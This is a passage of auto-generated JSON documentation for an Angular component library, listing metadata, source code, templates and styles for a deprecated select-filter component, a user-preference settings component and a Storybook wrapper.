          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "el",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 38,
        "jsdoctags": [
          {
            "name": "matSelect",
            "type": "MatSelect",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "el",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "AfterViewInit",
        "OnDestroy"
      ],
      "accessors": {
        "value": {
          "name": "value",
          "setSignature": {
            "name": "value",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "value",
                "type": "Array<T>",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 30,
            "jsdoctags": [
              {
                "name": "value",
                "type": "Array<T>",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "value",
            "type": "",
            "returnType": "",
            "line": 34
          }
        }
      },
      "templateData": "<div class=\"mat-option\" (click)=\"onSelectAllClick()\">\n  <mat-checkbox style=\"margin-right: 8px\" color=\"primary\" [checked]=\"state === 'checked'\" [indeterminate]=\"state === 'indeterminate'\"></mat-checkbox>\n  <span class=\"mat-option-text\">Select all</span>\n</div>\n"
    },
    {
      "name": "StoSelectFilterComponent",
      "id": "component-StoSelectFilterComponent-3e767f9f5bd0322087542990ff81c3c940154bc09a51a50104a4e03347a6ab18f803947055ba40f5eefde2dc85ffd64785916a18d593c871a1b180acc0e299f8",
      "file": "libs/form/src/lib/sto-select-filter/sto-select-filter.component.ts",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [
        {
          "name": "{\n    provide: NG_VALUE_ACCESSOR, useExisting: forwardRef(() => StoSelectFilterComponent), multi: true\n}",
          "type": "component"
        }
      ],
      "selector": "sto-select-filter",
      "styleUrls": [
        "./sto-select-filter.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-select-filter.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "focusIfNoValue",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nautomatically focus input element if it's empty\n",
          "description": "<p>automatically focus input element if it&#39;s empty</p>\n",
          "line": 138,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "isFilter",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nisFilter determines if filtering is active\n",
          "description": "<p>isFilter determines if filtering is active</p>\n",
          "line": 134,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "isMulti",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nisMulti determines if select all is available\n",
          "description": "<p>isMulti determines if select all is available</p>\n",
          "line": 130,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "selected",
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "pos": 2014,
              "end": 2033,
              "flags": 4227072,
              "modifierFlagsCache": 0,
              "transformFlags": 0,
              "kind": 338,
              "tagName": {
                "pos": 2015,
                "end": 2020,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "",
              "name": {
                "pos": 2021,
                "end": 2029,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "selected"
              },
              "isNameFirst": true,
              "isBracketed": false
            }
          ],
          "rawdescription": "\n\nDetermines the checkbox state. Can be checked, indeterminate or unchecked\n",
          "description": "<p>Determines the checkbox state. Can be checked, indeterminate or unchecked</p>\n",
          "line": 83,
          "type": "number",
          "decorators": []
        },
        {
          "name": "total",
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "pos": 1784,
              "end": 1800,
              "flags": 4227072,
              "modifierFlagsCache": 0,
              "transformFlags": 0,
              "kind": 338,
              "tagName": {
                "pos": 1785,
                "end": 1790,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "",
              "name": {
                "pos": 1791,
                "end": 1796,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "total"
              },
              "isNameFirst": true,
              "isBracketed": false
            }
          ],
          "rawdescription": "\n\nLength of unfiltered Array\n",
          "description": "<p>Length of unfiltered Array</p>\n",
          "line": 71,
          "type": "number",
          "decorators": []
        },
        {
          "name": "value",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nInitial value of the filter\n",
          "description": "<p>Initial value of the filter</p>\n",
          "line": 58,
          "type": "",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "selectAll",
          "defaultValue": "new EventEmitter<boolean>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits when selectAll checkbox changes\n",
          "description": "<p>Emits when selectAll checkbox changes</p>\n",
          "line": 121,
          "type": "EventEmitter"
        },
        {
          "name": "valueChanges",
          "defaultValue": "new EventEmitter<unknown>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits when the search value changes\n",
          "description": "<p>Emits when the search value changes</p>\n",
          "line": 125,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "_selected",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 116,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_total",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 113,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_value",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 110,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "checkboxControl",
          "defaultValue": "new UntypedFormControl()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 105,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "cssClass",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 101,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-select-filter'"
            }
          ]
        },
        {
          "name": "destroyed$",
          "defaultValue": "new Subject()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 139,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "indeterminate",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 108,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "inputControl",
          "defaultValue": "new UntypedFormControl()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 106,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "inputElement",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef<HTMLInputElement>",
          "optional": false,
          "description": "",
          "line": 103,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "'inputElement'"
            }
          ],
          "modifierKind": [
            123
          ]
        },
        {
          "name": "propagateChange",
          "defaultValue": "() => {...}",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 156
        },
        {
          "name": "select",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MatSelect",
          "optional": false,
          "description": "",
          "line": 142,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "isChecked",
          "args": [
            {
              "name": "isChecked",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 145,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "isChecked",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 174,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 168,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 184,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "registerOnChange",
          "args": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 160,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "registerOnTouched",
          "args": [
            {
              "name": "fn",
              "type": "",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 165,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "fn",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "writeValue",
          "args": [
            {
              "name": "value",
              "type": "",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 150,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": true,
      "deprecationMessage": [
        {
          "pos": 532,
          "end": 567,
          "flags": 4194304,
          "modifierFlagsCache": 0,
          "transformFlags": 0,
          "kind": 319,
          "text": "will be removed in v14 or v15, use "
        },
        {
          "pos": 567,
          "end": 602,
          "flags": 4194304,
          "modifierFlagsCache": 0,
          "transformFlags": 0,
          "kind": 322,
          "name": {
            "pos": 574,
            "end": 601,
            "flags": 4194304,
            "modifierFlagsCache": 0,
            "transformFlags": 0,
            "kind": 79,
            "escapedText": "StoOptionSelectAllComponent"
          },
          "text": ""
        }
      ],
      "hostBindings": [
        {
          "name": "class.sto-select-filter",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 101,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "<p>Component used in mat-select&#39;s to filter out the values, and adds a Select all checkbox</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\"></code></pre></div><p>public all = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;];\npublic filtered = [];\npublic selectAll(checked: boolean) {\n this.control.setValue(checked ? all : []);\n}\npublic filter(val: string) {\n   this.filtered = all.filter(x =&gt; x === val);\n}\n&lt;mat-select [formControl]=&quot;control&quot;&gt;\n  &lt;sto-select-filter (valueChanges)=&quot;filter($event)&quot; (selectAll)=&quot;selectAll($event)&quot;&gt;</sto-select-filter>\n  &lt;mat-option *ngFor=&quot;let v of filtered&quot;&gt;{{ v }}</mat-option>\n</mat-select></p>\n",
      "rawdescription": "\n\nComponent used in mat-select's to filter out the values, and adds a Select all checkbox\n\n```html\n```\npublic all = [\"a\", \"b\", \"c\"];\npublic filtered = [];\npublic selectAll(checked: boolean) {\n this.control.setValue(checked ? all : []);\n}\npublic filter(val: string) {\n   this.filtered = all.filter(x => x === val);\n}\n<mat-select [formControl]=\"control\">\n  <sto-select-filter (valueChanges)=\"filter($event)\" (selectAll)=\"selectAll($event)\"></sto-select-filter>\n  <mat-option *ngFor=\"let v of filtered\">{{ v }}</mat-option>\n</mat-select>\n",
      "type": "component",
      "sourceCode": "import {\n  AfterViewInit,\n  Component,\n  ElementRef,\n  EventEmitter,\n  forwardRef,\n  HostBinding,\n  Input,\n  OnDestroy,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { ControlValueAccessor, NG_VALUE_ACCESSOR, UntypedFormControl } from '@angular/forms';\nimport { Subject } from 'rxjs';\nimport { takeUntil } from 'rxjs/operators';\nimport { MatSelect } from '@angular/material/select';\n\n/**\n * Component used in mat-select's to filter out the values, and adds a Select all checkbox\n * @deprecated will be removed in v14 or v15, use {@link StoOptionSelectAllComponent}\n *\n * @example\n *\n * public all = [\"a\", \"b\", \"c\"];\n * public filtered = [];\n * public selectAll(checked: boolean) {\n *  this.control.setValue(checked ? all : []);\n * }\n * public filter(val: string) {\n *    this.filtered = all.filter(x => x === val);\n * }\n * <mat-select [formControl]=\"control\">\n *   <sto-select-filter (valueChanges)=\"filter($event)\" (selectAll)=\"selectAll($event)\"></sto-select-filter>\n *   <mat-option *ngFor=\"let v of filtered\">{{ v }}</mat-option>\n * </mat-select>\n */\n\n@Component({\n  selector: 'sto-select-filter',\n  templateUrl: './sto-select-filter.component.html',\n  styleUrls: [ './sto-select-filter.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  providers: [\n    {\n      provide: NG_VALUE_ACCESSOR,\n      useExisting: forwardRef(() => StoSelectFilterComponent),\n      multi: true\n    }\n  ]\n})\nexport class StoSelectFilterComponent implements OnInit, AfterViewInit, OnDestroy, ControlValueAccessor {\n\n  /**\n   * Initial value of the filter\n   */\n  @Input() set value(value: unknown) {\n    this._value = value;\n    this.writeValue(value);\n  }\n\n  get value(): unknown {\n    return this._value;\n  }\n\n  /**\n   * Length of unfiltered Array\n   * @param total\n   */\n  @Input() set total(total: number) {\n    this._total = total;\n  }\n\n  get total(): number {\n    return this._total;\n  }\n\n  /**\n   * Determines the checkbox state. Can be checked, indeterminate or unchecked\n   * @param selected\n   */\n  @Input() set selected(selected: number) {\n    if ( this.total === selected ) {\n      this.isChecked(true);\n      this.indeterminate = false;\n    } else if ( selected > 0 ) {\n      this.indeterminate = true;\n      this.isChecked(false);\n    } else {\n      this.indeterminate = false;\n      this.isChecked(false);\n    }\n    this._selected = selected;\n  }\n\n  get selected(): number {\n    return this._selected;\n  }\n\n  @HostBinding('class.sto-select-filter') cssClass = true;\n  @ViewChild('inputElement')\n  public inputElement: ElementRef<HTMLInputElement>;\n\n  public checkboxControl = new UntypedFormControl();\n  public inputControl = new UntypedFormControl();\n\n  public indeterminate: boolean;\n\n  private _value: unknown;\n\n\n  private _total: number;\n\n\n  private _selected: number;\n\n  /**\n   * Emits when selectAll checkbox changes\n   */\n  @Output() selectAll = new EventEmitter<boolean>();\n  /**\n   * Emits when the search value changes\n   */\n  @Output() valueChanges = new EventEmitter<unknown>();\n\n  /**\n   * isMulti determines if select all is available\n   */\n  @Input() isMulti: boolean;\n  /**\n   * isFilter determines if filtering is active\n   */\n  @Input() isFilter: boolean;\n  /**\n   * automatically focus input element if it's empty\n   */\n  @Input() focusIfNoValue: boolean;\n  private destroyed$ = new Subject();\n\n\n  constructor(public select: MatSelect) {\n  }\n\n  public isChecked(isChecked: boolean) {\n\n    this.checkboxControl.setValue(isChecked, { emitEvent: false });\n  }\n\n  writeValue(value: unknown) {\n    if ( value || value === '' ) {\n      this.inputControl.setValue(value);\n    }\n  }\n\n  propagateChange = (value: unknown) => {\n    this.valueChanges.emit(value);\n  };\n\n  registerOnChange(fn: never): void {\n    this.propagateChange = fn;\n  }\n\n  // eslint-disable-next-line\n  registerOnTouched(fn: unknown): void {\n  }\n\n  ngOnDestroy() {\n\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n  ngAfterViewInit(): void {\n    if ( this.select ) {\n      this.select.openedChange.pipe(takeUntil(this.destroyed$)).subscribe(open => {\n        if ( open && this.focusIfNoValue && this.isMulti ) {\n          this.inputElement?.nativeElement.focus();\n        }\n      });\n    }\n  }\n\n  ngOnInit() {\n    this.checkboxControl.valueChanges\n      .pipe(\n        takeUntil(this.destroyed$)\n      ).subscribe(isChecked => {\n      this.selectAll.emit(isChecked);\n    });\n\n    this.inputControl.valueChanges\n      .pipe(\n        takeUntil(this.destroyed$)\n      ).subscribe(value => {\n      if ( !value && this.focusIfNoValue ) {\n        requestAnimationFrame(() => this.inputElement.nativeElement.focus());\n      }\n      this.propagateChange(value);\n    });\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ".sto-select-filter{\n  white-space: nowrap;\n  overflow: hidden;\n  text-overflow: ellipsis;\n  line-height: 36px;\n  text-align: left;\n  text-decoration: none;\n  position: sticky;\n  width: 100%;\n  top: 0;\n  outline: 0;\n  display: flex;\n  flex-direction: row;\n  max-width: 100%;\n  box-sizing: border-box;\n  align-items: center;\n  z-index: 1;\n  .sto-form__field{\n    height: 48px;\n    .mat-form-field-flex {\n      padding: 2px 16px;\n      height: 48px;\n      border-radius: 0;\n      .mat-form-field-prefix{\n        margin-right: 16px;\n      }\n    }\n    .mat-form-field-underline{\n      width: 100%;\n      left: 0;\n      border-bottom-left-radius: 0;\n      border-bottom-right-radius: 0;\n      .mat-form-field-underline .mat-form-field-ripple{\n        border-bottom-left-radius: 0;\n        border-bottom-right-radius: 0;\n      }\n    }\n    &.mat-focused{\n      .mat-form-field-underline .mat-form-field-ripple{\n        border-bottom-left-radius: 0;\n        border-bottom-right-radius: 0;\n      }\n    }\n\n  }\n\n  .sto-form__field .mat-input-wrapper, .sto-form__field .mat-form-field-wrapper{\n    margin: 0;\n  }\n}\n\n\n.sto-select-filter{\n  &__select-all{\n    border-bottom: solid 1px rgba(0, 0, 0, 0.1);\n    width: 100%;\n    &.mat-option{\n      padding: 24px 16px;\n    }\n    &__checkbox{\n      width: 100%;\n      .mat-checkbox-inner-container{\n        margin-right: 16px;\n      }\n      .mat-checkbox-layout, .mat-checkbox-label{\n        width: 100%;\n      }\n    }\n  }\n}\n",
          "styleUrl": "./sto-select-filter.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "select",
            "type": "MatSelect",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 139,
        "jsdoctags": [
          {
            "name": "select",
            "type": "MatSelect",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "OnInit",
        "AfterViewInit",
        "OnDestroy",
        "ControlValueAccessor"
      ],
      "accessors": {
        "value": {
          "name": "value",
          "setSignature": {
            "name": "value",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "value",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 58,
            "rawdescription": "\n\nInitial value of the filter\n",
            "description": "<p>Initial value of the filter</p>\n",
            "jsdoctags": [
              {
                "name": "value",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "value",
            "type": "",
            "returnType": "",
            "line": 63
          }
        },
        "total": {
          "name": "total",
          "setSignature": {
            "name": "total",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "total",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 71,
            "rawdescription": "\n\nLength of unfiltered Array\n",
            "description": "<p>Length of unfiltered Array</p>\n",
            "jsdoctags": [
              {
                "name": {
                  "pos": 1791,
                  "end": 1796,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "total"
                },
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "pos": 1785,
                  "end": 1790,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": ""
              }
            ]
          },
          "getSignature": {
            "name": "total",
            "type": "number",
            "returnType": "number",
            "line": 75
          }
        },
        "selected": {
          "name": "selected",
          "setSignature": {
            "name": "selected",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "selected",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 83,
            "rawdescription": "\n\nDetermines the checkbox state. Can be checked, indeterminate or unchecked\n",
            "description": "<p>Determines the checkbox state. Can be checked, indeterminate or unchecked</p>\n",
            "jsdoctags": [
              {
                "name": {
                  "pos": 2021,
                  "end": 2029,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "selected"
                },
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "pos": 2015,
                  "end": 2020,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": ""
              }
            ]
          },
          "getSignature": {
            "name": "selected",
            "type": "number",
            "returnType": "number",
            "line": 97
          }
        }
      },
      "templateData": "<div class=\"sto-form\" style=\"width: 100%\" *ngIf=\"isFilter;else noFilter\">\n  <mat-form-field class=\"sto-form__field sto-form__field--without-placeholder\"\n                  floatLabel=\"never\">\n        <span matPrefix\n              *ngIf=\"isMulti !== false\">\n            <mat-checkbox color=\"primary\"\n           class=\"sto-select-filter__checkbox\"\n           #selectAll\n           [indeterminate]=\"indeterminate\"\n           [formControl]=\"checkboxControl\">\n        </mat-checkbox>\n        </span>\n        <mat-label>Search in list</mat-label>\n        <input [formControl]=\"inputControl\"\n               #inputElement\n               class=\"sto-select-filter__searchfield\"\n               autocomplete=\"off\"\n               matInput>\n        <mat-icon *ngIf=\"inputControl.value?.length > 0\"\n                  class=\"mat__icon--clickable\"\n                  (click)=\"inputControl.reset()\"\n                  matSuffix>close</mat-icon>\n        <mat-icon *ngIf=\"inputControl.value?.length <= 0\"\n                  matSuffix>search</mat-icon>\n    </mat-form-field>\n</div>\n<ng-template #noFilter>\n    <div class=\"sto-select-filter__select-all mat-option\">\n        <mat-checkbox color=\"primary\"\n                      class=\"sto-select-filter__select-all__checkbox \"\n                      #selectAll\n                      [indeterminate]=\"indeterminate\"\n                      [formControl]=\"checkboxControl\">\n           All\n        </mat-checkbox>\n    </div>\n</ng-template>\n\n\n\n"
    },
    {
      "name": "StoUserPreferenceComponent",
      "id": "component-StoUserPreferenceComponent-54bdd0876ef6e8a1d7259cdfe709516777179b150d389eca0eee7ad0d1954f9a66192d160e95d1b5c5266abbba6874a4dc4f165d2c01cbbb2f3e8856621d515d",
      "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-user-preference",
      "styleUrls": [
        "./sto-user-preference.component.css"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-user-preference.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "destroyed$",
          "defaultValue": "new Subject<boolean>()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 15,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "form",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "UntypedFormGroup",
          "optional": false,
          "description": "",
          "line": 14,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "initForm",
          "args": [
            {
              "name": "value",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 20,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "value",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 44,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 33,
          "deprecated": false,
          "deprecationMessage": ""
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component, OnDestroy, OnInit } from '@angular/core';\nimport { UntypedFormBuilder, UntypedFormGroup } from '@angular/forms';\nimport { take, takeUntil } from 'rxjs/operators';\nimport { Subject } from 'rxjs';\nimport { StoUserPreferenceService } from './sto-user-preference.service';\n\n@Component({\n  selector: 'sto-user-preference',\n  templateUrl: './sto-user-preference.component.html',\n  styleUrls: [ './sto-user-preference.component.css' ]\n})\nexport class StoUserPreferenceComponent implements OnInit, OnDestroy {\n\n  public form: UntypedFormGroup;\n  private destroyed$ = new Subject<boolean>();\n\n  constructor(private fb: UntypedFormBuilder, private service: StoUserPreferenceService) {\n  }\n\n  private initForm(value: boolean ) {\n    this.form = this.fb.group({\n      hasSelectTextOnFocusEnabled: [value]\n    });\n    this.form.get('hasSelectTextOnFocusEnabled')?.valueChanges\n      .pipe(\n        takeUntil(this.destroyed$)\n      )\n      .subscribe((hasSelectTextOnFocusEnabled) => {\n        this.service.setHasSelectTextOnFocusEnabled(hasSelectTextOnFocusEnabled);\n      });\n  }\n\n  ngOnInit() {\n    this.service.hasSelectTextOnFocusEnabled.asObservable()\n      .pipe(\n        take(1)\n      )\n      .subscribe((value) => {\n        this.initForm(value);\n      });\n\n  }\n\n  ngOnDestroy() {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "",
          "styleUrl": "./sto-user-preference.component.css"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "fb",
            "type": "UntypedFormBuilder",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "service",
            "type": "StoUserPreferenceService",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 15,
        "jsdoctags": [
          {
            "name": "fb",
            "type": "UntypedFormBuilder",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "service",
            "type": "StoUserPreferenceService",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "OnInit",
        "OnDestroy"
      ],
      "templateData": "<mat-expansion-panel [expanded]=\"false\">\n  <mat-expansion-panel-header>\n    <mat-panel-title>Settings<span style=\"opacity: 0.36\">&nbsp;(beta)</span></mat-panel-title>\n  </mat-expansion-panel-header>\n  <div *ngIf=\"form\" class=\"sto-grid sto-grid--4\">\n\n    <ng-content></ng-content>\n\n  </div>\n</mat-expansion-panel>\n"
    },
    {
      "name": "WrapperComponent",
      "id": "component-WrapperComponent-4ef0d4d909e383286b6def41da71b137b75525a6bb8318194ab7a6bf1a6da03449aa0d575070a228265da3edd338ea05e9b8ae4314f495d9643cc65331bf65b5",
      "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "wrapper",
      "styleUrls": [],
      "styles": [],
      "template": "Hi",
      "templateUrl": [],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\nimport { moduleMetadata } from '@storybook/angular';\nimport { MatButtonModule } from '@angular/material/button';\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\nimport { MatIconModule, MatIconRegistry } from '@angular/material/icon';\nimport { NavDrawerComponent, NavDrawerModule, Navigation } from '@ngx-stoui/drawer';\nimport { RouterTestingModule } from '@angular/router/testing';\nimport { BrowserModule } from '@angular/platform-browser';\nimport { CommonModule } from '@angular/common';\nimport { Component, Injectable } from '@angular/core';\nimport { StoAppHeaderModule } from '@ngx-stoui/common';\nimport { action } from '@storybook/addon-actions';\n\n@Component({\n  selector: 'wrapper',\n  template: 'Hi'\n})\nclass WrapperComponent {\n}\n\n@Injectable({ providedIn: 'root' })\nclass IconService {\n  constructor(private iconReg: MatIconRegistry) {\n    this.iconReg.setDefaultFontSetClass('material-icons-outline');\n  }\n}\n\nexport default {\n  title: 'Navigation/Drawer',\n  component: NavDrawerComponent,\n  parameters: {},\n  decorators: [\n    moduleMetadata({\n      declarations: [ WrapperComponent ],\n      providers: [ IconService ],\n      imports: [\n        NavDrawerModule,\n        StoAppHeaderModule,\n        MatIconModule,\n        MatButtonModule,\n        BrowserAnimationsModule,\n        RouterTestingModule.withRoutes([\n          { path: '**', component: WrapperComponent }\n        ]),\n        BrowserModule,\n        CommonModule\n      ]\n    })\n  ],\n  argTypes: {\n    open: 